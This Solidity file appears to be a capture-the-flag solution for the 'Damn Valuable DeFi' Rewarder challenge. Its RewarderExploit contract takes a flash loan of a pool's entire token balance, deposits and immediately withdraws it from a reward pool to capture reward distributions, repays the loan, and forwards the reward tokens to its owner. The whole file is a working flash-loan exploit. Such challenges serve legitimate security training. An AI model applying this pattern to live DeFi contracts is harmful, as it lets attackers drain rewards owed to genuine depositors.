// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./RewardToken.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external;
}

/**
 * @title RewarderExploit
 */
contract RewarderExploit {
    IFlashLoanerPool public flashLoanPool;
    ITheRewarderPool public rewarderPool;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;
    address owner;

    constructor(
        address _token,
        address _flashLoanPool,
        address _rewarderPool,
        address _rewardToken
    ) {
        owner = msg.sender;
        liquidityToken = DamnValuableToken(_token);
        flashLoanPool = IFlashLoanerPool(_flashLoanPool);
        rewarderPool = ITheRewarderPool(_rewarderPool);
        liquidityToken.approve(address(rewarderPool), type(uint256).max);
        rewardToken = RewardToken(_rewardToken);
    }

    function execute() external {
        require(msg.sender == owner);
        uint256 poolBalance = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(poolBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        require(liquidityToken.transfer(address(flashLoanPool), amount));
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        require(rewardToken.transfer(owner, rewardBalance));
    }
}
